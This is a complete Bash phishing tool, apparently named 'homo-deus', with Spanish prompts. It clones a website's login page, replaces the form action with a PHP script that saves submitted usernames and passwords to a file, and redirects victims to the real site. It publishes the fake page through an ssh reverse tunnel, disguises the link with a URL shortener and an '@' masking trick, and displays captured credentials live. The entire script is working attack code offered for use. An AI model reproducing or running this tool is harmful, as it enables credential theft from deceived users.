#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" END="$(printf '\033[0m\e[0m')"

ctrl_c(){
	sudo pkill php &>/dev/null
	sudo pkill xterm &>/dev/null
	if [[ -f "credentials.txt" && -s "credentials.txt" ]];then
		clear
		banner
		echo -e "[${CYAN}X${END}] ${CYAN}Credenciales capturadas:${END}"
		cat credentials.txt
		atras
	fi
	rm link.txt &>/dev/null
	exit 1
} 2>/dev/null

trap ctrl_c INT

banner() {
	cat <<- EOF
	
${MAGENTA}██╗  ██╗ ██████╗ ███╗   ███╗ ██████╗       ██████╗ ███████╗██╗   ██╗███████╗
${MAGENTA}██║  ██║██╔═══██╗████╗ ████║██╔═══██╗      ██╔══██╗██╔════╝██║   ██║██╔════╝
${MAGENTA}███████║██║   ██║██╔████╔██║██║   ██║█████╗██║  ██║█████╗  ██║   ██║███████╗
${MAGENTA}██╔══██║██║   ██║██║╚██╔╝██║██║   ██║╚════╝██║  ██║██╔══╝  ██║   ██║╚════██║
${MAGENTA}██║  ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝      ██████╔╝███████╗╚██████╔╝███████║
${MAGENTA}╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝       ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ ${RED}1.0
                            ${CYAN}By: Alcatraz2033
                ${GREEN}Github: https://github.com/Alcatraz2033${END}
                
	EOF
}

clone(){
	clear
	banner
	rm -fr web &>/dev/null
	read -r -p "[${CYAN}+${END}] ${CYAN}Ingrese el link del sitio web:${END} " enlace
	su $(cat /etc/passwd | grep 1000 | awk -F ':' '{print $1}') -c "mkdir web"
	cd web
	echo -e "[${CYAN}+${END}] ${CYAN}Clonando sitio web${END}"
	su $(cat /etc/passwd | grep 1000 | awk -F ':' '{print $1}') -c "httrack $enlace"
	clear
	banner

	linea=$(grep -R 'id="pass' | tr -d ":" | awk '{print $1}' | head -n1)
	word=$(grep -R 'id="pass' | tr -d ":" | awk '{print $1}' | head -n1 | awk -F '/' '{print $NF}')
	path=$(echo $linea	| sed "s/$word//")
	cd $path

	if [ $word != 'index.html' ];then
		mv $word index.html &>/dev/null
	fi

	for iterator in {1..100};do
		for i in $(cat index.html | grep -m 1 'action="http');do
			echo $i | grep 'action="http' &>/dev/null
			if [ $? == 0 ];then
				echo $(echo $i | grep -o '".*"' | tr -d '"') | grep "/" &>/dev/null
				if [ $? == 0 ];then
					action=$(echo $(echo $i | grep -o '".*"' | tr -d '"') | sed 's/\//\\\//g') &>/dev/null
					sed -i "s/$action/login.php/g" index.html &>/dev/null
				else
					action=$(echo $i | grep -o '".*"' | tr -d '"') &>/dev/null
					sed -i "s/$action/login.php/g" index.html &>/dev/null
				fi
				break
			fi
		done
	done

	for pass in $(cat index.html | grep -m1 'id="pass');do
		echo $pass | grep 'id="pass' &>/dev/null
		if [ $? == 0 ];then
			pass_id=$(echo $pass | grep -o '".*"' | tr -d '"')
			break
		fi
	done

	for user in $(cat index.html | grep -m1 'id="user' );do
		echo $user | grep 'id="user' &>/dev/null
		if [ $? == 0 ];then
			user_id=$(echo $user | grep -o '".*"' | tr -d '"')
			break
		else
			for email in $(cat index.html | grep -m1 'id="email' );do
				echo $email | grep 'id="email' &>/dev/nul
				if [ $? == 0 ];then
					user_id=$(echo $email | grep -o '".*"' | tr -d '"')
				fi
			done
		fi
	done

	php > login.php
	sudo service apache2 stop &>/dev/null
	sudo php -S 127.0.0.1:80 &>/dev/null & 
	if [ $1 == 'Local_Host' ];then
		echo -e "[${CYAN}+${END}] ${CYAN}Link: ${END} http://127.0.0.1 o http://$(hostname -I | awk '{print $1}')"
		xterm -hold -title "Credenciales" -e "watch -n1 cat credentials.txt" &
		while true;do
			sleep 1
		done
	else
		xterm -geometry 93x20-50-350 -hold -title "Servidor" -e "ssh -R 80:localhost:80 localhost.run > link.txt" &
		while true;do
			if [[ -f 'link.txt' && -s 'link.txt' ]];then
				link=$(cat link.txt | awk '{print $NF}')
				if [ $2 == 'Enmascarar_link' ];then
					mask $link $enlace 
				else
					clear
					banner
					echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $link"
					echo $link | xclip -sel clip
					echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"
				fi
				break
			fi
		done
		xterm -geometry 93x20-750-350 -hold -title "Credenciales" -e "watch -n1 cat credentials.txt" &
		while true;do
			sleep 1
		done
	fi
}

mask(){
	plantilla=$(echo "https://$(echo $2 | awk -F '/' '{print $3}')")
	echo -e "[${CYAN}+${END}] ${RED}(OPCIONAL) ${CYAN}Ingrese el complemento de la plantilla separado por '-' Ejemplo: photos-perros${END}"
	read -r -p "[${CYAN}+${END}] ${CYAN}Complemento de la plantilla:${END} " complemento 
	complemento2=$(echo $complemento | sed 's/-/%7A/g')
	curl -s --data "url=$1&shorturl=&opt=0" https://is.gd/create.php | html2text > masbien.tmp
	link=$(cat masbien.tmp | grep "https" | head -n 1 | sed 's/\[//' | sed 's/\]//' | sed 's/https:\/\///')

	if [ ! $complemento ];then
		complete="$plantilla@$link"
		clear
		banner
		echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $complete"
	    echo $complete | xclip -sel clip
		echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
	    
	else
		complete="$plantilla%7A$complemento2@$link"
		clear
		banner
		echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $complete"
	    echo $complete | xclip -sel clip
		echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
	fi
	rm masbien.tmp 
}

php() {
	cat <<- EOF
<?php
file_put_contents("credentials.txt", "[+] Web -> Usuario: " . \$_POST["$user_id"] . " Contraseña: " . \$_POST["$pass_id"] . "\n", FILE_APPEND);
header('Location: $enlace');
exit();
?>
	EOF
}

atras(){
	cred=$(cat credentials.txt)
	path=$(pwd | awk -F '/' '{print $NF}')
	while [[ $path != 'homo-deus' ]];do
		cd ..
		path=$(pwd | awk -F '/' '{print $NF}')
	done
	rm -fr web &>/dev/null
	echo $cred >> credentials.txt
}

if [ $(id -u) -ne "0" ];then
    echo -e "\n[!]${RED} Ejecute este script como root...${END}\n"
    exit 1
else
	clone $1 $2
fi
